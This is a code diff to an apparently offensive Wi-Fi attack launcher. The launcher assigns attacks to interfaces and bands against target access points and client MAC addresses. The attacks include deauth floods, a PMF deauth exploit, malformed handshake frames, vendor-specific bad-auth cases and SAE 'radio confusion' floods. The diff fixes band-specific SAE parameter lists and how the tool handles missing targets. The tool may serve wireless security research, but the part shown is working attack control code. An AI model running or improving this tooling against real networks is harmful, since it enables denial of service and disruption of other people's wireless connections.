+        elif attack_name in["case2_bad_auth_algo_broadcom", "case8_bad_auth_algo_qualcomm",
                              "case9_bad_sequence_number", "case10a_bad_auth_body_empty",
                              "case10b_bad_auth_body_payload", "case11_seq_status_fuzz",
-                             "case12_bursty_auth", "pmf_deauth_exploit", "deauth_flood", "malformed_msg1",
-                             "case1_denial_of_internet", "case3_bad_status_code",
+                             "case12_bursty_auth", "pmf_deauth_exploit", "deauth_flood", "malformed_msg1_length",
+                             "malformed_msg1_flags", "case1_denial_of_internet", "case3_bad_status_code",
                              "case4_bad_send_confirm", "case5_empty_frame"]:
             return TARGET_STA_MACS
         else:
-            return []
+            return[]
     
     try:
         while True:
@@ -758,6 +761,13 @@ def main():
                 ap = ap_targets.get('5ghz' if band=='5GHz' else '2.4ghz')
                 if not ap: continue
                 
+                required_clients = get_clients_for_attack(attack)
+                if not required_clients and attack not in["bad_algo", "bad_seq", "bad_status_code", "empty_frame_confirm", "cookie_guzzler"]:
+                    if iface not in warned_interfaces:
+                        print(f"\n[WARN] {iface}: No target clients specified for '{attack}'. Attack skipped.")
+                        warned_interfaces.add(iface)
+                    continue
+
                 restart_needed = False
                 if iface not in procs or not procs[iface].is_alive():
                     restart_needed = True
@@ -769,11 +779,13 @@ def main():
                         cleanup({iface: procs[iface]})
                     active_channels[iface] = ap['channel']
                     
-                    # Determine SAE lists
-                    if attack in ["case6_radio_confusion", "case13_radio_confusion_mediatek_reverse"]:
-                        s_hex, f_hex = SAE_SCALAR_5_HEX_LIST, SAE_FINITE_5_HEX_LIST
-                    elif attack in ["case6_radio_confusion_reverse", "case13_radio_confusion_mediatek"]:
+                    # FIX: Assign SAE lists based on the band we are sending on!
+                    if attack in["case6_radio_confusion", "case13_radio_confusion_mediatek_reverse"]:
+                        # Sender is on 2.4 GHz, so use 2.4 GHz parameters
                         s_hex, f_hex = SAE_SCALAR_2_4_HEX_LIST, SAE_FINITE_2_4_HEX_LIST
+                    elif attack in["case6_radio_confusion_reverse", "case13_radio_confusion_mediatek"]:
+                        # Sender is on 5 GHz, so use 5 GHz parameters
+                        s_hex, f_hex = SAE_SCALAR_5_HEX_LIST, SAE_FINITE_5_HEX_LIST
                     else:
                         s_hex = SAE_SCALAR_5_HEX_LIST if band=='5GHz' else SAE_SCALAR_2_4_HEX_LIST
                         f_hex = SAE_FINITE_5_HEX_LIST if band=='5GHz' else SAE_FINITE_2_4_HEX_LIST
@@ -784,13 +796,9 @@ def main():
                           'channel_5ghz': ap_targets['5ghz']['channel'],
                           'bssid_2_4ghz': ap_targets['2.4ghz']['bssid'],
                           'channel_2_4ghz': ap_targets['2.4ghz']['channel'],
-                          'clients': get_clients_for_attack(attack)}
+                          'clients': required_clients}
                     
-                    if not kw['clients'] and attack not in ["bad_algo", "bad_seq", "bad_status_code", "empty_frame_confirm", "cookie_guzzler"]:
-                        print(f"[WARN] {iface}: No clients for {attack}, skipping.")
-                        continue
-                    
-                    print(f"[START] {iface} ({band}): {attack} on CH {ap['channel']} | Clients:{len(kw['clients'])}")
+                    print(f"\n[START] {iface} ({band}): {attack} on CH {ap['channel']} | Target Clients: {len(kw['clients'])}")
                     p = Process(target=ATTACKS[attack], args=(iface, counters[iface]), kwargs=kw)
                     p.start()
                     procs[iface] = p
